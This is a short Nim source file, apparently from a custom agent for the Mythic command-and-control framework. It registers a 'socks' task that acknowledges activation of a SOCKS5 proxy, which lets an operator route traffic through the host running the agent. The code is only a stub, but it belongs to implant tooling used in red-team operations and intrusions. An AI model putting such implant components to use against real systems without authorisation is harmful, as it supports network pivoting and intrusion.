## socks — Enable SOCKS5 proxy via Mythic.
## The Python create_go_tasking calls SendMythicRPCProxyStartCommand to open
## the local proxy on Mythic's side. The agent just acknowledges the task;
## the actual SOCKS5 relaying happens in the main loop via socks_mgr.
import std/json
import ../types
import ./registry

proc socksExecute(taskId: string, params: JsonNode, state: AgentState,
                  send: SendMsg): TaskResult =
  return TaskResult(
    output: "SOCKS5 proxy activated. Mythic is routing traffic through this agent.",
    status: "success",
    completed: true,
  )

proc initSocks*() =
  register("socks", socksExecute)
